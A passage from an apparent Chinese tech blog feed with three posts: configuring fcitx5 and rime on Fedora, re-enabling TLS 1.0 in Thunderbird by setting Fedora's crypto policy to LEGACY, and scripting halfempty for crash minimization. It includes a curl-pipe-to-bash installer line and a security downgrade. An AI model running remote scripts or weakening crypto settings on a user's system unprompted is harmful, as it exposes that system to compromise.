<span class="hljs-built_in">cp</span> /usr/share/applications/org.fcitx.Fcitx5.desktop ~/.config/autostart<br></code></pre></td></tr></table></figure><p>执行命令 <code>sudo alternatives --config xinputrc</code>  ，选择 fcitx5。执行命令 <code>im-chooser</code> 选择 fcitx5</p><p>启动输入法很简单，自己手动执行 <code>fcitx5 -d</code> 即可。</p><h2 id="设置正确的环境变量"><a href="#设置正确的环境变量" class="headerlink" title="设置正确的环境变量"></a>设置正确的环境变量</h2><p>修改  <code>~/.xprofile</code>， <code>~/.zshrc</code> ，  <code>~/.xinitrc</code> ，<code>~/.bash_profile</code> ， <code>/etc/profile</code> 等文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">GTK_IM_MODULE</span>=fcitx<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">QT_IM_MODULE</span>=fcitx<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">XMODIFIERS</span>=<span class="hljs-string">&quot;@im=fcitx&quot;</span><br></code></pre></td></tr></table></figure><p>有的文章中说要设置成 fcitx5 但是根据 <code>fcitx5-diagnose</code> 正确的环境变量应该是 fcitx</p><p> environment.d 是 system.d 引入的，被  GDM 或 Plasma 5.22+ 支持，可以往 <code>~/.config/environment/</code> 目录写文件，注意不要写 <strong>export</strong> 。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF &gt; ~/.config/environment.d/00-fcitx5.conf</span><br><span class="hljs-string">INPUT_METHOD=fcitx5</span><br><span class="hljs-string">GTK_IM_MODULE=fcitx</span><br><span class="hljs-string">QT_IM_MODULE=fcitx</span><br><span class="hljs-string">XMODIFIERS=@im=fcitx</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><h2 id="配置中文环境"><a href="#配置中文环境" class="headerlink" title="配置中文环境"></a>配置中文环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/locale.conf<br><br><span class="hljs-built_in">export</span> LANG=<span class="hljs-string">&quot;zh_CN.UTF-8&quot;</span><br><span class="hljs-built_in">export</span> LC_CTYPE=<span class="hljs-string">&quot;zh_CN.UTF-8&quot;</span><br></code></pre></td></tr></table></figure><h2 id="安装-rime-词库"><a href="#安装-rime-词库" class="headerlink" title="安装 rime 词库"></a>安装 rime 词库</h2><p>rime 现在已经使用 plum 管理词库，如果需要安装双拼输入法的，可以执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://git.io/rime-install | bash<br>rime_frontend=fcitx5-rime bash rime-install double_pinyin<br></code></pre></td></tr></table></figure><p>rime 为了保证输入速度，词库很小，为了能够自动显示更多的词组，就需要使用拓展词库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/rime-aca/dictionaries.git<br><span class="hljs-built_in">cp</span> dictionaries/luna_pinyin.dict/* ~/.local/share/fcitx5/rime/<br></code></pre></td></tr></table></figure><p>安装了上面的拓展词库后，输入特殊符号的能力还是比较弱，需要把 symbols.yaml 也给加进来。</p><p><a href="https://github.com/rime/rime-prelude">https://github.com/rime/rime-prelude</a> 提供了我们所需要的 symbols.yaml 和 default.yaml，可以使用 <a href="https://github.com/rime/plum">東風破</a> 安裝： <code>rime_frontend=fcitx5-rime bash rime-install prelude</code></p><p>由于我们使用的是自然码双拼，需要修改的文件为 <code>double_pinyin.custom.yaml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">patch:</span><br>  <span class="hljs-comment"># 載入朙月拼音擴充詞庫</span><br>  <span class="hljs-attr">&quot;translator/dictionary&quot;:</span> <span class="hljs-string">luna_pinyin.extended</span><br>  <span class="hljs-attr">&quot;punctuator/import_preset&quot;:</span> <span class="hljs-string">symbols</span><br>  <span class="hljs-attr">&quot;recognizer/patterns/punct&quot;:</span> <span class="hljs-string">&quot;^/([A-Z|a-z]*|[0-9]|10)$&quot;</span><br></code></pre></td></tr></table></figure><p>设置完成后，要重新启动输入法，比如要输入 ☆ ，输入  <code>/xh</code> 即可</p><h2 id="rime-安装-Emoji"><a href="#rime-安装-Emoji" class="headerlink" title="rime 安装 Emoji"></a>rime 安装 Emoji</h2><p>😄️Emoji 表情在现在的聊天中已经很常见了，rime 对 emoji 也提供了支持。参考 <a href="https://github.com/rime/rime-emoji">https://github.com/rime/rime-emoji</a>  安装 emoji 同样需要使用 <a href="https://github.com/rime/plum">東風破</a>，我常用的输入法是双拼，将 double_pinyin 替换成你的输入法就可以了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">rime_frontend=fcitx5-rime bash rime-install emoji<br>rime_frontend=fcitx5-rime bash rime-install emoji:customize:schema=double_pinyin<br></code></pre></td></tr></table></figure><p>核心的码表在 <a href="https://github.com/rime/rime-emoji/blob/master/opencc/emoji_category.txt">https://github.com/rime/rime-emoji/blob/master/opencc/emoji_category.txt</a> 在输入汉字的时候会自动提示相应的 emoji。rime-emoji 有时候不能很准确地输出想要的 emoji 符号，这时候可以利用 emoji_category.txt 查询相关分类，例如输入 「颜色」就会显示出各种颜色。</p><h2 id="添加自己词库的方法"><a href="#添加自己词库的方法" class="headerlink" title="添加自己词库的方法"></a>添加自己词库的方法</h2><p>在用户档案目录，新建一个 custom.extended.dict.yaml 内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># custom.extended.dict.yaml</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">name:</span> <span class="hljs-string">custom.extended</span><br><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;2024.4.26&quot;</span><br><span class="hljs-attr">sort:</span> <span class="hljs-string">by_weight</span><br><span class="hljs-attr">use_preset_vocabulary:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">import_tables:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">luna_pinyin</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">luna_pinyin.extended</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">gemoji</span><br><span class="hljs-string">...</span><br><br><span class="hljs-string">我的新词</span><br></code></pre></td></tr></table></figure><p>这里可以自由导入你想要添加的码表，也可以添加自己的自定义词组。我导入了 <a href="https://gist.githubusercontent.com/chuangzhu/f60b128fbdae2e30d6edeaf3307489eb/raw/d9b6e250ca035d85190e6b6dd99c4dc1ad4f78c5/gemoji.dict.yaml">github rime Emoji 码表</a></p><p>接着再于 *.schema.yaml 或 *.custom.yaml 中将 translator&#x2F;dictionary 设置成此字典档即可，例如：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">patch</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">translator/dictionary</span><span class="hljs-punctuation">:</span> <span class="hljs-string">custom.extended</span><br></code></pre></td></tr></table></figure><p>这样以后 luna_pinyin.extended 升级后，不会对自己添加的词组造成影响，可以直接升级覆盖。</p><h2 id="将用户词库导入-rime"><a href="#将用户词库导入-rime" class="headerlink" title="将用户词库导入 rime"></a>将用户词库导入 rime</h2><p><code>rime_dict_manager -i luna_pinyin luna_pinyin.userdb.txt</code></p><p>这一步很关键啊，多年的积累不能浪费了。</p><h2 id="配置-fcitx5-皮肤"><a href="#配置-fcitx5-皮肤" class="headerlink" title="配置 fcitx5 皮肤"></a>配置 fcitx5 皮肤</h2><p>fcitx5 默认的皮肤不太好看，所以下载更新了皮肤，这款简约风格的皮肤非常符合老夫的胃口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/thep0y/fcitx5-themes.git<br><span class="hljs-built_in">cp</span> spring ~/.local/share/fcitx5/themes -r<br></code></pre></td></tr></table></figure><p>修改配置文件 <code>~/.config/fcitx5/conf/classicui.conf</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 垂直候选列表</span><br><span class="hljs-string">Vertical</span> <span class="hljs-string">Candidate</span> <span class="hljs-string">List=False</span><br><br><span class="hljs-comment"># 按屏幕 DPI 使用</span><br><span class="hljs-string">PerScreenDPI=True</span><br><br><span class="hljs-comment"># Font (设置成你喜欢的字体)</span><br><span class="hljs-string">Font=&quot;Smartisan</span> <span class="hljs-string">Compact</span> <span class="hljs-string">CNS</span> <span class="hljs-number">13</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 主题(这里要改成你想要使用的主题名，主题名就在下面)</span><br><span class="hljs-string">Theme=spring</span><br></code></pre></td></tr></table></figure><p>另外还有一款 fcitx5 皮肤相对流行：<a href="https://github.com/hosxy/Fcitx5-Material-Color">https://github.com/hosxy/Fcitx5-Material-Color</a></p><p>切换皮肤的方法是，点击鼠标右键点击 配置 -&gt; 附加组件 -&gt; 经典用户界面 -&gt; 点击右边图标 -&gt; 选择皮肤</p><h2 id="设置-fcitx-rime-单行模式"><a href="#设置-fcitx-rime-单行模式" class="headerlink" title="设置 fcitx rime 单行模式"></a>设置 fcitx rime 单行模式</h2><p>如果要将输入法设置为单行模式，需要修改配置文件 <code>~/.config/fcitx5/conf/rime.conf</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">PreeditInApplication=True</span><br></code></pre></td></tr></table></figure><p>或者按快捷键 <code>ctrl + alt + p</code>, 这个快捷键可以来回切换很方便，单行还是双行就因人而异了，我个人觉得单行好点。</p><h2 id="让-fcitx5-正确显示菜单"><a href="#让-fcitx5-正确显示菜单" class="headerlink" title="让 fcitx5 正确显示菜单"></a>让 fcitx5 正确显示菜单</h2><p>要做这个步骤是因为 rime 有 「部署」、「同步」这几个操作按钮，如果不正确配置的话在 fcitx5 上没法正常显示。fcitx5 在任务上有个托盘图标，点击右键就可以看到这些菜单。</p><p>要让 fcitx 正确显示菜单，关键在于让 rime 输入法默认处于激活状态，根据 fcitx5 配置的提示第一个输入法为非激活状态。</p><ul><li>（1） 将第一个输入法设置为  键盘-英语 （美国），第二个输入法设置为 中州韵</li><li>（2） 在全局设置中，勾上默认状态为激活，共享输入状态设置为 <code>程序</code></li></ul><h2 id="fcitx-vim"><a href="#fcitx-vim" class="headerlink" title="fcitx.vim"></a>fcitx.vim</h2><p>这个章节是写给 linux vim 用户看的，没有此需求的可以直接跳过这段。</p><p>vim 确实是程序编辑的利器，但是在用vim 写中文文档的时候，有一个痛点，你在用 fcitx 写中文的时候想保存文档，vim 必须切换到 normal 模式才能输入保存的命令 <code>:w</code>，进入normal 模式的方法是连续按两下 ESC，好了现在你应该输入命令了，但是你没法输入你现在还在打中文呢，没有办法你必须先切换到英文输入法，然后才能正确地输入 <code>:w</code> 痛苦啊。</p><p>fcitx.vim 就是为解决这个痛点而生的插件，个人觉得这是vim 必装的几个插件之一。fcitx.vim 的github 仓库地址为：<a href="https://github.com/lilydjwg/fcitx.vim">https://github.com/lilydjwg/fcitx.vim</a></p><p>值得一提的是这个仓库有两个分支，fcitx4 分支 和 fcitx5 分支，使用的时候一定要分清楚，这两个分支如果使用错了，就没法正常使用 fcitx.vim 插件了。fcitx4 和 fcitx5 dbus 对象名字有变化，导致代码通用性不好。现在默认分支为 fcitx5，如果你使用 fcitx4 可能直接 git clone 下来就会发现插件用不了，我也是因为这个原因才发现 fcitx 居然更新了。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>可能有些人不知道为什么要折腾 rime，rime 的用户词库文件是个宝贝，这个词库是都是你真实的在日常使用中用到的词库，小巧又实用还能到处同步，上传到云后永不丢失，符合自己的数据自己掌握的硬道理。至于国内的那些输入法，我就不加以评价了，在这商业的社会要保持基本的做人底线不易。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://fcitx-im.org/wiki/Setup_Fcitx_5">https://fcitx-im.org/wiki/Setup_Fcitx_5</a></li><li><a href="https://xuthus.cc/misc/fedora-install-fcitx5.html">https://xuthus.cc/misc/fedora-install-fcitx5.html</a></li><li><a href="https://gist.github.com/ukazap/6495324cf3220b1fef0484e8fdb244ab">https://gist.github.com/ukazap/6495324cf3220b1fef0484e8fdb244ab</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ThunerBird 78.8.1 连接 TLS 1.0 失败问题和 Linux 乱谈</title>
    <link href="/cn/thunderbird.tls.1.0/"/>
    <url>/cn/thunderbird.tls.1.0/</url>
    
    <content type="html"><![CDATA[<p>我在公司使用 Linux 作用主力机已经 10 多年了，自从抛弃 Ubuntu 转入 Fedora 怀抱，生活幸福了不少。<br>早年最大的问题是 OFFICE 软件，工作中少不了要和 doc、ppt，xls 打交道，又没有太好的软件可以使用。<br>刚开始基本就两个解决方案，wine office 和永中 OFFICE，这两个方案都不是太理想，wine 的速度很慢，<br>永中则兼容性比较差，还会出现文档格式看起来就有明显差异的情况。。</p><p>随着金山 wps 的发展，现在 OFFICE 的问题基本解决，作为轻度 EXCEL 使用者基本已经满足需求了。Linux<br>现在主要问题是字体渲染比较差，中文经常看起来发虚，如果能把这个问题彻底解决就非常不错了。作为Linux<br>老用户，各种魔改后，也能较好使用了，但后面发现还是换个显示器更管用。要解决中文显示问题，有两个<br>字体很管用，文泉驿微米黒和微软雅黑，实践证明把系统字体用上面两个字体替换，显示效果也就好了不少了。</p><p>Ubuntu Linux 最大的问题就是不太稳定，基本每次大版本升级显示都要挂，弄得我都有点心理阴影了，原来<br>周围还挺多同学使用 Linux，最终放弃了，一个直接用 Windows 了，还有一个 Windows 上跑一个 Linux 虚拟机。<br>Ubuntu 还有个坏习惯喜欢乱改，upstart，Unity等，后面都没有成为主流，bug 就更不用说了，经常挺闹心的。</p><p>Fedora 从近些年的使用情况来看，还是很不错的，网络中流传是 Redhat Linux Enterprise 的小白版本，<br>但是其实只要 bug 修得快，你大概率是感觉不到的。遇上问题，放狗一搜就会发现 redhat 已经有 bug 在<br>处理中了，于是乎就有了今天这篇。</p><p>在升级到 Fedara 33 和 ThunderBird 78 后，使用 TLS 连接公司的 ExChange 邮件服务器就连不上了。<br>我们公司的内网安全审核非常严格，邮件不使用加密连接要限时整改。放狗一搜发现，大批人员都遇上了<br>相同的问题，也有人给出了解决方案。</p><p><a href="https://support.mozilla.org/en-US/questions/1295861">https://support.mozilla.org/en-US/questions/1295861</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">I think this could be due <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> minimum <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> TLS supported <span class="hljs-keyword">by</span> TB <span class="hljs-number">78.</span> The release notes state <br>that versions <span class="hljs-built_in">lower</span> than <span class="hljs-number">1.2</span> are disabled, so <span class="hljs-keyword">if</span> your server only supports v. <span class="hljs-number">1.1</span>, <br>you might be able <span class="hljs-built_in">to</span> fix sending <span class="hljs-keyword">by</span> changing <span class="hljs-keyword">the</span> preference security.tls.<span class="hljs-built_in">version</span>.<span class="hljs-built_in">min</span> <span class="hljs-built_in">to</span> <span class="hljs-number">2</span> <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> default <span class="hljs-number">3</span>, <span class="hljs-keyword">in</span> Config. editor.<br><br></code></pre></td></tr></table></figure><p><a href="https://www.thunderbird.net/en-US/thunderbird/78.0/releasenotes/">https://www.thunderbird.net/en-US/thunderbird/78.0/releasenotes/</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">TLS</span> <span class="hljs-number">1</span>.<span class="hljs-number">0</span> and <span class="hljs-number">1</span>.<span class="hljs-number">1</span> disabled<br></code></pre></td></tr></table></figure><p>如何开启 TLS 1.0， mozilla 也给出了相应的方案</p><p><a href="https://support.mozilla.org/en-US/kb/thunderbird-78-faq#w_how-to-enable-outdated-security-protocols-tls-1-0-and-1-1">https://support.mozilla.org/en-US/kb/thunderbird-78-faq#w_how-to-enable-outdated-security-protocols-tls-1-0-and-1-1</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim">How <span class="hljs-keyword">to</span> enable outdated security protocols TLS <span class="hljs-number">1.0</span> <span class="hljs-built_in">and</span> <span class="hljs-number">1.1</span><br><br>Open Config Editor (abou<span class="hljs-variable">t:config</span>)<br>≡ &gt; Preferences &gt; Find in Preferences<br>In the searchbox, <span class="hljs-built_in">type</span>: abou<span class="hljs-variable">t:config</span>, then press Enter.<br>Click <span class="hljs-keyword">on</span> the button Config Editor… in the <span class="hljs-built_in">search</span> result.<br>In the abou<span class="hljs-variable">t:config</span> dialog, <span class="hljs-built_in">search</span> <span class="hljs-keyword">for</span>: security.tls.<span class="hljs-keyword">version</span>.<span class="hljs-built_in">min</span><br>Double-click <span class="hljs-keyword">on</span> the found preference security.tls.<span class="hljs-keyword">version</span>.<span class="hljs-built_in">min</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">change</span> its value <span class="hljs-keyword">to</span> <span class="hljs-number">1</span>, then press Enter.<br>Restart Thunderbird <span class="hljs-built_in">and</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> download your <span class="hljs-keyword">messages</span>.<br>If you can receive <span class="hljs-built_in">and</span>/<span class="hljs-built_in">or</span> send your <span class="hljs-keyword">messages</span> after changing this preference:<br><br>Please inform your email provider <span class="hljs-keyword">to</span> upgrade the security protocols <span class="hljs-keyword">on</span> the server <span class="hljs-keyword">to</span> support TLS <span class="hljs-number">1.2</span>.<br>Revert the preference security.tls.<span class="hljs-keyword">version</span>.<span class="hljs-built_in">min</span> <span class="hljs-keyword">to</span> its original value <span class="hljs-keyword">as</span> soon <span class="hljs-keyword">as</span> possible by repeating <br>the above procedure, then <span class="hljs-keyword">right</span>-click <span class="hljs-keyword">on</span> the preference <span class="hljs-built_in">and</span> choose Reset from the context <span class="hljs-keyword">menu</span>.<br><br></code></pre></td></tr></table></figure><p>看上去解决方案很简单，在 Preferences 中的搜索框里输入 <code>about:config</code> 点击进入，将其中的<br><code>security.tls.version.min</code> 设置为 1 就好了，但是在 Fedora 34 中不起作用。我用 wireshark 抓了包看，<br>ThunderBird 自己报告不支持的协议版本。我仔细研究了一下 ThunderBird 相关的 config 项有下面几个：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">security</span>.tls.<span class="hljs-keyword">version</span>.min<br><span class="hljs-keyword">security</span>.tls.<span class="hljs-keyword">version</span>.<span class="hljs-keyword">enable</span>-deprecated<br><span class="hljs-keyword">security</span>.tls.<span class="hljs-keyword">version</span>.fallback-<span class="hljs-keyword">limit</span><br></code></pre></td></tr></table></figure><p>我把这几个选项都设置了一下，分别设置为 1 true 1，还是不管用。</p><p>在 Fedora 33 上这个问题就没解决，这都 Fedora 34 了，所以又花了时间研究了一下。没好办法，放狗，运气<br>不错，看到了这篇</p><p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1674092#c11">https://bugzilla.mozilla.org/show_bug.cgi?id=1674092#c11</a></p><p>原来 Fedora 还有个 <code>StrongCryptoSettings</code> ，看文档可以修改</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span>-crypto-policies --<span class="hljs-keyword">set</span> DEFAULT:FEDORA32<br><span class="hljs-keyword">update</span>-crypto-policies --<span class="hljs-keyword">set</span> LEGACY<br>reboot<br></code></pre></td></tr></table></figure><p>关键的内容就是下面这几行</p><p>cat &#x2F;etc&#x2F;crypto-policies&#x2F;state&#x2F;CURRENT.pol</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">min_tls_version</span> = TLS1.<span class="hljs-number">2</span><br><span class="hljs-attribute">protocol</span> = TLS1.<span class="hljs-number">3</span> TLS1.<span class="hljs-number">2</span> DTLS1.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>执行后变为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">min_tls_version</span> = TLS1.<span class="hljs-number">0</span><br><span class="hljs-attribute">protocol</span> = TLS1.<span class="hljs-number">3</span> TLS1.<span class="hljs-number">2</span> TLS1.<span class="hljs-number">1</span> TLS1.<span class="hljs-number">0</span> DTLS1.<span class="hljs-number">2</span> DTLS1.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>重启系统后，又可以开心地使用 ThunderBird 了 ^_^</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>halfempty 的一些使用说明</title>
    <link href="/cn/halfempty/"/>
    <url>/cn/halfempty/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/googleprojectzero/halfempty">https://github.com/googleprojectzero/halfempty</a></p><p>google P0 <a href="https://twitter.com/taviso">@taviso</a> 提供的 testcase 并行快速精简工具 （A fast, parallel test case minimization tool）<br>需要注意的是 halfempty 只能精简导致目标程序 crash 的 testcase，如果 testcase 不导致目标程序 crash， 还是需要使用 afl-tmin 类似的工具根据 coverage 来精简。</p><p>halfempty 工具向测试脚本传递内容时使用的是 pipe， 如果测试的程序只接受文件路径作为参数时，需要一些技巧，README 虽然有提及但是说的比较晦涩。</p><p>以 upx 为例，upx 的命令行帮助如下</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stata">root@fuzzing-5:/mnt/disk/halfempty# ./upx.out_x86-64<br>                       Ultimate Packer <span class="hljs-keyword">for</span> eXecutables<br>                          <span class="hljs-keyword">Copyright</span> (C) 1996 - 2020<br>UPX git-d7ba31+ Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020<br><br>Usage: upx.out_x86-64 [-123456789dlthVL] [-qvfk] [-o <span class="hljs-keyword">file</span>] <span class="hljs-keyword">file</span>..<br><br>Commands:<br>  -1     <span class="hljs-keyword">compress</span> faster                   -9    <span class="hljs-keyword">compress</span> better<br>  -<span class="hljs-keyword">d</span>     decompress                        -<span class="hljs-keyword">l</span>    <span class="hljs-keyword">list</span> compressed <span class="hljs-keyword">file</span><br>  -t     <span class="hljs-keyword">test</span> compressed <span class="hljs-keyword">file</span>              -V    <span class="hljs-keyword">display</span> <span class="hljs-keyword">version</span> number<br>  -<span class="hljs-keyword">h</span>     give <span class="hljs-keyword">more</span> <span class="hljs-keyword">help</span>                    -<span class="hljs-keyword">L</span>    <span class="hljs-keyword">display</span> software license<br>Options:<br>  -q     be quiet                          -v    be verbose<br>  -oFILE write output to &#x27;<span class="hljs-keyword">FILE</span>&#x27;<br>  -f     force compression of suspicious files<br>  -k     <span class="hljs-keyword">keep</span> backup files<br><span class="hljs-keyword">file</span>..   executables to (<span class="hljs-keyword">de</span>)<span class="hljs-keyword">compress</span><br><br><span class="hljs-keyword">Type</span> &#x27;upx.out_x86-64 --<span class="hljs-keyword">help</span>&#x27; <span class="hljs-keyword">for</span> <span class="hljs-keyword">more</span> detailed <span class="hljs-keyword">help</span>.<br><br>UPX comes with ABSOLUTELY <span class="hljs-keyword">NO</span> WARRANTY; <span class="hljs-keyword">for</span> details visit https:<span class="hljs-comment">//upx.github.io</span><br></code></pre></td></tr></table></figure><p>upx 只能使用文件路径作为参数， 比如像这样执行命令。 <code>./upx.out_x86-64 crash.upx</code></p><p>按照 README 中的例子编写测试脚本 test.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>./upx.out_x86-64 <span class="hljs-variable">$1</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> $? -eq 139; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>执行的时候会报错</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gams">./halfempty ./test.sh  crash.upx<br>╭│   │ ── halfempty ───────────────────────────────────────────────── v0<span class="hljs-number">.30</span> ──<br>╰│ <span class="hljs-number">16</span>│ A fast, parallel testcase minimization tool<br> ╰───╯ ───────────────────────────────────────────────────────── by @taviso ──<br><br>Input <span class="hljs-keyword">file</span> <span class="hljs-string">&quot;crash.upx&quot;</span> is now <span class="hljs-number">19088</span> bytes, starting strategy <span class="hljs-string">&quot;bisect&quot;</span>...<br><span class="hljs-function"><span class="hljs-title">Verifying</span></span> the original input executes successfully... (skip with --noverify)<br><span class="hljs-comment">** Message: This program expected `./test1.sh` to return successfully</span><br><span class="hljs-comment">** Message: for the original input (i.e. exitcode zero).</span><br><span class="hljs-comment">** Message: Try it yourself to verify it&#x27;s working.</span><br><span class="hljs-comment">** Message: Use a command like: `cat crash.upx | ./test.sh || echo failed`</span><br><br><span class="hljs-comment">** (halfempty:2477): WARNING **: Strategy &quot;bisect&quot; failed, cannot continue.</span><br></code></pre></td></tr></table></figure><p>正确的方法是使用临时文件，因为 halfempty 是一个并行的工具，每次使用的临时文件都应该不一样。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>tempfile=`<span class="hljs-built_in">mktemp</span>` &amp;&amp; <span class="hljs-built_in">cat</span> &gt; <span class="hljs-variable">$&#123;tempfile&#125;</span><br><br>./upx.out_x86-64 <span class="hljs-variable">$&#123;tempfile&#125;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> $? -eq 139; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">exit</span> 1<br><span 